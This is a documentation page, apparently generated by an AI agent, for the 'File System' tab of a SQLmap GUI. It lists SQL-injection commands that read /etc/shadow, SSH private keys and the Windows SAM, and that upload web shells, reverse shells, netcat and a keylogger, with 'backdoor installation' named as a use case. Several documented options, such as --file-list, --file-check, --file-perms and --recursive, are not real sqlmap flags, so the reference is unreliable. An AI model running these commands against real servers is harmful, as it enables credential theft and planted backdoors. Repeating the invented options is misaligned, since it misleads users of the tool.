# File System Tab - File System Access and File Operations

The File System tab controls how SQLmap accesses and manipulates files on the target database server, including reading, writing, uploading, and downloading files.

## 📋 Overview

The File System tab contains four main sections:
1. **File Reading** - Read files from the server
2. **File Writing** - Write files to the server
3. **File Upload/Download** - Transfer files to/from server
4. **Directory Operations** - Directory listing and navigation

## 📖 File Reading Options

### Read a File from the Back-end DBMS File System
**Parameter:** `--file-read=FILE`
**Description:** Read a file from the database server
**Examples:**
```
--file-read=/etc/passwd
--file-read=C:\Windows\System32\drivers\etc\hosts
--file-read=/var/www/html/config.php
--file-read=/home/user/.ssh/id_rsa
```
**Use Cases:**
- Configuration file access
- Password file reading
- Source code analysis
- Log file examination

### Read Multiple Files
**Parameter:** `--file-read=FILE1,FILE2,FILE3`
**Description:** Read multiple files in one command
**Examples:**
```
--file-read=/etc/passwd,/etc/shadow
--file-read=config.php,db.php,admin.php
--file-read=.htaccess,.htpasswd
```
**Use Cases:**
- Batch file reading
- Related file analysis
- Configuration file sets

## ✏️ File Writing Options

### Write a Local File to the Back-end DBMS File System
**Parameter:** `--file-write=LOCAL_FILE --file-dest=REMOTE_PATH`
**Description:** Upload a local file to the server
**Examples:**
```
--file-write=/local/shell.php --file-dest=/var/www/html/shell.php
--file-write=C:\local\nc.exe --file-dest=C:\Windows\Temp\nc.exe
--file-write=./webshell.jsp --file-dest=/opt/tomcat/webapps/ROOT/shell.jsp
```
**Use Cases:**
- Web shell deployment
- Backdoor installation
- Configuration modification

### Destination Path for File Write
**Parameter:** `--file-dest=PATH`
**Description:** Destination path for uploaded files
**Examples:**
```
--file-dest=/var/www/html/uploads/
--file-dest=C:\inetpub\wwwroot\
--file-dest=/tmp/
--file-dest=/home/user/public_html/
```
**Use Cases:**
- Web-accessible directories
- Temporary directories
- User home directories

## 📁 Directory Operations

### List Files and Directories
**Parameter:** `--file-list=PATH`
**Description:** List contents of a directory
**Examples:**
```
--file-list=/var/www/html/
--file-list=C:\Windows\System32\
--file-list=/etc/
--file-list=/home/
```
**Use Cases:**
- Directory structure exploration
- File discovery
- Permission assessment

### Recursive Directory Listing
**Parameter:** `--file-list=PATH --recursive`
**Description:** Recursively list directory contents
**Behavior:** Lists all files and subdirectories
**Examples:**
```
--file-list=/var/www/ --recursive
--file-list=C:\Program Files\ --recursive
--file-list=/home/user/ --recursive
```
**Use Cases:**
- Complete file system mapping
- Large directory structure analysis
- Comprehensive reconnaissance

## 🔄 File Transfer Options

### Download Files from Server
**Parameter:** `--file-read=REMOTE_FILE`
**Description:** Download files from the server to local machine
**Behavior:** Files are saved to sqlmap output directory
**Examples:**
```
--file-read=/var/log/apache2/access.log
--file-read=C:\Windows\System32\config\SAM
--file-read=/etc/mysql/my.cnf
```
**Use Cases:**
- Log file analysis
- Configuration backup
- Evidence collection

### Upload Files to Server
**Parameter:** `--file-write=LOCAL_FILE --file-dest=REMOTE_DEST`
**Description:** Upload local files to server
**Examples:**
```
--file-write=./reverse_shell.php --file-dest=/var/www/html/rs.php
--file-write=C:\tools\netcat.exe --file-dest=C:\Temp\nc.exe
--file-write=./keylogger.py --file-dest=/tmp/keylogger.py
```
**Use Cases:**
- Tool deployment
- Backdoor installation
- Configuration changes

## 🔧 Advanced File System Options

### Check File Existence
**Parameter:** `--file-check=FILE`
**Description:** Check if a file exists on the server
**Examples:**
```
--file-check=/etc/passwd
--file-check=C:\Windows\System32\cmd.exe
--file-check=/var/www/html/admin.php
```
**Use Cases:**
- File presence verification
- Path validation
- Security assessment

### Get File Size
**Parameter:** `--file-size=FILE`
**Description:** Get the size of a file on the server
**Examples:**
```
--file-size=/var/log/syslog
--file-size=C:\Windows\System32\ntoskrnl.exe
--file-size=/etc/passwd
```
**Use Cases:**
- File size assessment
- Download planning
- Storage analysis

### Get File Permissions
**Parameter:** `--file-perms=FILE`
**Description:** Get file permissions on the server
**Examples:**
```
--file-perms=/etc/shadow
--file-perms=C:\Windows\System32\config\
--file-perms=/var/www/html/
```
**Use Cases:**
- Permission assessment
- Security analysis
- Access control review

## 📝 Usage Examples

### Basic File Reading
```
Read File: /etc/passwd
```
**Generated Command:**
```bash
sqlmap -u "http://example.com/page.php?id=1" --file-read=/etc/passwd
```

### Web Shell Upload
```
Write Local File: ./shell.php
Destination: /var/www/html/uploads/shell.php
```
**Generated Command:**
```bash
sqlmap -u "http://example.com/upload.php?id=1" --file-write=./shell.php --file-dest=/var/www/html/uploads/shell.php
```

### Directory Exploration
```
List Directory: /var/www/html/
Recursive: ✓ Enabled
```
**Generated Command:**
```bash
sqlmap -u "http://example.com/browse.php?id=1" --file-list=/var/www/html/ --recursive
```

### Configuration File Access
```
Read Multiple Files: /etc/mysql/my.cnf,/var/www/config.php,/home/user/.bashrc
```
**Generated Command:**
```bash
sqlmap -u "http://example.com/admin.php?id=1" --file-read=/etc/mysql/my.cnf,/var/www/config.php,/home/user/.bashrc
```

### Windows System File Access
```
Read File: C:\Windows\System32\drivers\etc\hosts
List Directory: C:\Windows\System32\
```
**Generated Command:**
```bash
sqlmap -u "http://example.com/win.php?id=1" --file-read=C:\Windows\System32\drivers\etc\hosts --file-list=C:\Windows\System32\
```

### File System Reconnaissance
```
Check File: /root/.ssh/id_rsa
Get Size: /var/log/auth.log
Get Permissions: /etc/shadow
```
**Generated Command:**
```bash
sqlmap -u "http://example.com/recon.php?id=1" --file-check=/root/.ssh/id_rsa --file-size=/var/log/auth.log --file-perms=/etc/shadow
```

## ⚠️ Important Considerations

### File Path Formats
- **Unix/Linux**: Use forward slashes `/path/to/file`
- **Windows**: Use backslashes `C:\path\to\file` or forward slashes `C:/path/to/file`
- **Web roots**: Common locations `/var/www/html/`, `/var/www/`, `C:\inetpub\wwwroot\`
- **User directories**: `/home/user/`, `C:\Users\user\`

### Permission Requirements
- **Database user privileges**: File operations require appropriate database permissions
- **OS-level permissions**: Database user must have OS read/write permissions
- **Web server user**: Often runs as `www-data`, `apache`, `nobody`
- **Privilege escalation**: May need to escalate privileges for sensitive files

### Security Implications
- **Sensitive files**: Reading `/etc/passwd`, `/etc/shadow`, SAM files
- **Configuration files**: Database configs, web server configs
- **Log files**: Access logs, error logs, authentication logs
- **SSH keys**: Private keys in `~/.ssh/`
- **Source code**: Application source files

### Performance Considerations
- **Large files**: Reading large files can be slow and memory-intensive
- **Recursive listing**: Can generate enormous output on large file systems
- **Network transfer**: File uploads/downloads depend on network speed
- **Server load**: File operations can impact server performance

## 🔧 Troubleshooting

### File Read Access Denied
**Problem:** Cannot read files due to permission errors
**Solutions:**
1. Check database user privileges
2. Try different file paths
3. Use OS command execution for file access
4. Escalate database privileges if possible

### File Write Failing
**Problem:** Cannot write files to the server
**Solutions:**
1. Verify write permissions on target directory
2. Check available disk space
3. Try different destination paths
4. Use absolute paths instead of relative

### Directory Listing Empty
**Problem:** Directory listing returns no results
**Solutions:**
1. Verify directory exists and is readable
2. Check path format (Unix vs Windows)
3. Try without recursive flag first
4. Use OS commands for directory listing

### File Not Found Errors
**Problem:** Specified files don't exist on the server
**Solutions:**
1. Use --file-list to explore directory structure
2. Try common file locations
3. Check path case sensitivity
4. Verify file system type and structure

### Large File Transfer Issues
**Problem:** Large files failing to transfer
**Solutions:**
1. Check available memory and disk space
2. Use chunked transfer if available
3. Compress files before transfer
4. Split large files into smaller parts

### Character Encoding Issues
**Problem:** File contents display incorrectly
**Solutions:**
1. Specify correct encoding with --charset
2. Use hex dump for binary files
3. Check file type and encoding
4. Use appropriate text encoding conversion

## 📚 Related Tabs

- **[OS Access Tab](os_access_tab.md)**: Operating system command execution
- **[UDF Tab](udf_tab.md)**: User-defined function creation and execution
- **[Enumeration Tab](enumeration_tab.md)**: Database structure discovery
- **[General Tab](general_tab.md)**: Output and logging options</content>
<parameter name="filePath">/home/devil/Desktop/SQLmap-GUI-Advanced-SQL-Injection-Testing-Interface/docs/tabs/file_system.md
